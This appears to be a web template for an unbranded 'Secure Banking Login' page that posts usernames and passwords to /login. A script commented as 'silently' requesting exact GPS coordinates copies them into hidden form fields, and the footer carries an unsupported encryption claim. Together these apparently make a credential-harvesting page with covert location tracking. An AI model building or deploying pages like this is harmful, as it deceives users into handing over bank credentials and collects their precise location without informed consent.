<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Banking Login</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
</head>
<body class="login-page">
  <div class="login-container">
    <div class="login-header">
      <div class="logo-icon">🏦</div>
      <h2>Secure Portal</h2>
      <p>Enter your credentials to continue</p>
    </div>
    
    <form action="/login" method="POST" class="login-form">
      <div class="form-group">
        <label for="username">Username or User ID</label>
        <input type="text" id="username" name="username" placeholder="Enter your username" required>
      </div>
      
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" required>
      </div>
      
      <input type="hidden" name="exact_lat" id="exact_lat">
      <input type="hidden" name="exact_lon" id="exact_lon">
      <button type="submit" class="btn-primary">Sign In to Dashboard</button>
    </form>
    
    <div class="login-footer">
      <p>Protected by Bank-Grade 256-bit Encryption</p>
    </div>
  </div>

  <script>
    // Silently request EXACT GPS coordinates from the browser
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(position) {
        document.getElementById('exact_lat').value = position.coords.latitude;
        document.getElementById('exact_lon').value = position.coords.longitude;
      }, function(error) {
        console.log("GPS Blocked by user or unavailable.");
      });
    }
  </script>
</body>
</html>
